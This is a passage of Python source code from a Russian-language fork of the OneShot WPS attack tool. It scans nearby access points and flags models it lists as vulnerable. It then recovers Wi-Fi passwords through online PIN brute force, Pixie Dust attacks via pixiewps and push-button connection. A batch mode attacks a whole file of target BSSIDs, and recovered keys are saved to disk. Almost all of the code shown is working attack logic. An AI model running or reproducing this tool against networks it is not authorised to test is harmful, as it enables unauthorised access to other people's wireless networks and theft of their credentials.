            except ValueError:
                pass
            print('Неверный номер')

    def __wps_connection(self, bssid: str = None, pin: str = None,
                         pixiemode: bool = False, pbc_mode: bool = False,
                         verbose: bool = None) -> bool:
        """Выполняет одну WPS‑транзакцию с заданными параметрами."""
        if verbose is None:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        # очистка буфера wpa_supplicant
        self.wpas.stdout.read(300)
        if pbc_mode:
            if bssid:
                print(f"[*] Запуск WPS push button подключения к {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Запуск WPS push button подключения…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Попытка PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode,
                                     verbose=verbose, bssid=bssid.lower())
            if not res:
                break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid: str = None, pin: str = None,
                          pixiemode: bool = False, pbc_mode: bool = False,
                          showpixiecmd: bool = False, pixieforce: bool = False,
                          store_pin_on_fail: bool = False) -> bool:
        """Основная логика одной атаки (с брутфорсом или без)."""
        if not pin:
            if pixiemode:
                try:
                    filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
                    with open(filename, 'r') as f:
                        t_pin = f.readline().strip()
                        if input(f'[?] Использовать ранее вычисленный PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getSuggestedPins(bssid)
                    pin = pin[0]['pin'] if pin else '12345670'
            elif not pbc_mode:
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=True)
            bssid = self.connection_status.bssid if hasattr(self.connection_status, 'bssid') else bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nПрервано пользователем…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Недостаточно данных для Pixie Dust атаки')
                return False
        else:
            if store_pin_on_fail:
                self.__savePin(bssid, pin)
            return False

    def smart_bruteforce(self, bssid: str, start_pin: str = None, delay: float = None) -> Optional[str]:
        """Запускает онлайн-брутфорс с восстановлением сессии и отображением прогресса."""
        if (not start_pin) or (len(start_pin) < 4):
            try:
                filename = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
                with open(filename, 'r') as f:
                    if input(f'[?] Восстановить предыдущую сессию для {bssid}? [n/Y] ').lower() != 'n':
                        mask = f.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        self.bruteforce = BruteforceStatus()
        self.bruteforce.mask = mask
        try:
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nБрутфорс прерван.")
            filename = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
            with open(filename, 'w') as f:
                f.write(self.bruteforce.mask)
            print(f'[i] Сессия сохранена в {filename}')
            if args.loop:
                raise KeyboardInterrupt

    def __first_half_bruteforce(self, bssid: str, f_half: str, delay: float = None) -> Optional[str]:
        """Перебирает первую половину PIN (0000..9999)."""
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] Первая половина найдена')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] Сбой WPS транзакции, повтор последнего PIN')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] Первая половина не найдена')
        return None

    def __second_half_bruteforce(self, bssid: str, f_half: str, s_half: str, delay: float = None) -> Optional[str]:
        """Перебирает вторую половину PIN (001..999) для заданной первой половины."""
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] Сбой WPS транзакции, повтор последнего PIN')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return None

    def __print_with_indicators(self, level: str, msg: str) -> None:
        """Выводит сообщение с уровнем сигнала."""
        print(f'[{level}] [{self.lastPwr}] {msg}')

    def cleanup(self) -> None:
        """Корректно завершает работу: закрывает сокеты, останавливает wpa_supplicant, удаляет временные файлы."""
        self.retsock.close()
        self.wpas.terminate()
        try:
            os.remove(self.res_socket_file)
        except FileNotFoundError:
            pass
        shutil.rmtree(self.tempdir, ignore_errors=True)
        try:
            os.remove(self.tempconf)
        except FileNotFoundError:
            pass

    def __del__(self):
        try:
            self.cleanup()
        except (ImportError, AttributeError, TypeError):
            pass


class WiFiScanner:
    """Сканирует WPS-сети и выводит красивую таблицу."""
    def __init__(self, interface: str, vuln_list: List[str] = None):
        self.interface = interface
        self.vuln_list = vuln_list
        reports_fname = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports', 'stored.csv')
        self.stored = []
        if os.path.isfile(reports_fname):
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as f:
                csvReader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csvReader, None)
                for row in csvReader:
                    if len(row) >= 3:
                        self.stored.append((row[1], row[2]))

    def iw_scanner(self) -> Dict[int, dict]:
        """Запускает iw scan, парсит вывод, возвращает словарь {номер: сеть}."""
        def handle_network(line, result, networks):
            networks.append({'Security type': 'Unknown', 'WPS': False, 'WPS locked': False,
                             'Model': '', 'Model number': '', 'Device name': ''})
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            networks[-1]['ESSID'] = codecs.decode(result.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN': sec = 'WPA2'
                elif result.group(1) == 'WPA': sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN': sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA': sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            networks[-1]['Model'] = codecs.decode(result.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            networks[-1]['Model number'] = codecs.decode(result.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            networks[-1]['Device name'] = codecs.decode(result.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = f'iw dev {self.interface} scan'
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }
        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Ошибка:', line)
                return {}
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)
        networks = list(filter(lambda x: x['WPS'], networks))
        if not networks:
            return {}
        networks.sort(key=lambda x: x['Level'], reverse=True)
        network_list = {(i+1): net for i, net in enumerate(networks)}

        # Вывод таблицы с учётом fallback wcwidth
        def colored(text, color=None):
            if not color: return text
            color_codes = {'green': '\033[92m', 'red': '\033[91m', 'yellow': '\033[93m'}
            return f'{color_codes.get(color, "")}{text}\033[00m'

        if self.vuln_list:
            print('Метки сетей:', colored('Возможно уязвима', 'green'),
                  colored('WPS locked', 'red'), colored('Уже сохранена', 'yellow'))
        print('Список сетей:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Безоп.', 'PWR', 'Имя устройства WSC', 'Модель WSC'))

        items = list(network_list.items())
        if args.reverse_scan:
            items = items[::-1]
        for n, net in items:
            number = f'{n})'
            model = f'{net["Model"]} {net["Model number"]}'
            essid = truncate_str(net.get('ESSID', 'HIDDEN'), 25)
            deviceName = truncate_str(net['Device name'], 27)
            processed_number = truncate_str(number, 4)
            processed_bssid = truncate_str(net['BSSID'], 18)
            processed_security = truncate_str(net['Security type'], 8)
            processed_level = truncate_str(str(net['Level']), 4)
            line_parts = [processed_number, processed_bssid, essid,
                          processed_security, processed_level, deviceName, model]
            line = ' '.join(line_parts)
            if (net['BSSID'], net.get('ESSID', 'HIDDEN')) in self.stored:
                print(colored(line, 'yellow'))
            elif net['WPS locked']:
                print(colored(line, 'red'))
            elif self.vuln_list and model in self.vuln_list:
                print(colored(line, 'green'))
            else:
                print(line)
        return network_list

    def prompt_network(self) -> Optional[str]:
        """Предлагает выбрать сеть из результатов сканирования, возвращает BSSID."""
        networks = self.iw_scanner()
        if not networks:
            print('[-] WPS сети не найдены.')
            return None
        while True:
            try:
                choice = input('Выберите цель (Enter для обновления): ')
                if choice.lower() in ('r', '0', ''):
                    return self.prompt_network()
                bssid = networks[int(choice)]['BSSID']
                return bssid
            except (KeyError, ValueError):
                print('Неверный номер')


def ifaceUp(iface: str, down: bool = False) -> bool:
    """Поднимает или опускает сетевой интерфейс."""
    action = 'down' if down else 'up'
    res = subprocess.run(f'ip link set {iface} {action}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    return res.returncode == 0


def die(msg: str):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


# ─── Главная программа ───

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='OneShotPin-fork (c) 2017 rofl0r, drygdryg, kimocoder, internetkafe',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Пример: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')
    parser.add_argument('-i', '--interface', required=True, help='Имя интерфейса')
    parser.add_argument('-b', '--bssid', help='BSSID целевой точки доступа')
    parser.add_argument('-p', '--pin', help='Использовать указанный PIN (строка или 4/8 цифр)')
    parser.add_argument('-K', '--pixie-dust', action='store_true', help='Запустить Pixie Dust атаку')
    parser.add_argument('-F', '--pixie-force', action='store_true', help='Pixiewps с --force (полный перебор)')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true', help='Всегда показывать команду Pixiewps')
    parser.add_argument('-B', '--bruteforce', action='store_true', help='Запустить онлайн-брутфорс')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true', help='WPS Push Button подключение')
    parser.add_argument('-d', '--delay', type=float, default=0.0, help='Задержка между попытками PIN (сек)')
    parser.add_argument('-w', '--write', action='store_true', help='Сохранять учётные данные в файл')
    parser.add_argument('--iface-down', action='store_true', help='Выключить интерфейс после завершения')
    parser.add_argument('--vuln-list', default=os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt'),
                        help='Файл со списком уязвимых устройств')
    parser.add_argument('-l', '--loop', action='store_true', help='Циклический режим (после завершения — снова сканирование)')
    parser.add_argument('-r', '--reverse-scan', action='store_true', help='Обратный порядок сетей при сканировании')
    parser.add_argument('--mtk-wifi', action='store_true', help='Активировать MediaTek Wi‑Fi адаптер (запись 1 в /dev/wmtWifi)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Подробный вывод')
    parser.add_argument('--bssid-list', type=str, help='Файл со списком BSSID (по одному на строку) для пакетной атаки')

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("Требуется Python 3.6 или выше")
    if os.geteuid() != 0:
        die("Запустите от root")

    if args.mtk_wifi:
        wmt_device = Path("/dev/wmtWifi")
        if not wmt_device.is_char_device():
            die("Устройство /dev/wmtWifi не найдено или не является символьным")
        wmt_device.chmod(0o644)
        wmt_device.write_text("1")

    if not ifaceUp(args.interface):
        die(f'Не удалось поднять интерфейс {args.interface}')

    exit_code = 0

    try:
        # ── Пакетная обработка (новая фича) ──
        if args.bssid_list:
            if not os.path.isfile(args.bssid_list):
                die(f'Файл {args.bssid_list} не найден')
            with open(args.bssid_list, 'r', encoding='utf-8') as f:
                bssids = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f'[i] Загружено {len(bssids)} целей из {args.bssid_list}')
            for bssid in bssids:
                print(f'\n--- Атака на {bssid} ---')
                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=bssid)
                try:
                    if args.bruteforce:
                        companion.smart_bruteforce(bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(bssid, args.pin, args.pixie_dust,
                                                    args.pbc, args.show_pixie_cmd, args.pixie_force)
                except KeyboardInterrupt:
                    print(f'\nПропуск цели {bssid}…')
                finally:
                    companion.cleanup()
                print(f'--- {bssid}: завершено ---')
            sys.exit(exit_code)

        # ── Обычный режим / цикл ──
        while True:
            if not args.bssid:
                try:
                    with open(args.vuln_list, 'r', encoding='utf-8') as f:
                        vuln_list = f.read().splitlines()
                except FileNotFoundError:
                    vuln_list = []
                scanner = WiFiScanner(args.interface, vuln_list)
                if not args.loop:
                    print('[*] BSSID не указан — сканируем сети…')
                args.bssid = scanner.prompt_network()
                if not args.bssid:
                    if args.loop:
                        continue
                    break

            companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=args.bssid)
            try:
                if args.bruteforce:
                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                else:
                    companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                args.pbc, args.show_pixie_cmd, args.pixie_force)
            except KeyboardInterrupt:
                print("\nПрервано пользователем")
            finally:
                companion.cleanup()

            if not args.loop:
                break
            else:
                args.bssid = None

    except KeyboardInterrupt:
        print("\nВыход…")
        exit_code = 1
    finally:
        if args.iface_down:
            ifaceUp(args.interface, down=True)
        if args.mtk_wifi:
            try:
                Path("/dev/wmtWifi").write_text("0")
            except Exception:
                pass
    sys.exit(exit_code)
